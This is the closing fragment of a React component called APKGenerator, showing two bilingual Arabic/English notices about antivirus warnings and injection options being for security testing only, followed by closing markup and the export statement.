              <p>• {isArabic ? 'بعض الميزات قد تؤدي لتحذيرات مكافح الفيروسات' : 'Some features may trigger antivirus warnings'}</p>
              <p>• {isArabic ? 'خيارات الحقن للاختبار الأمني فقط' : 'Injection options for security testing only'}</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default APKGenerator;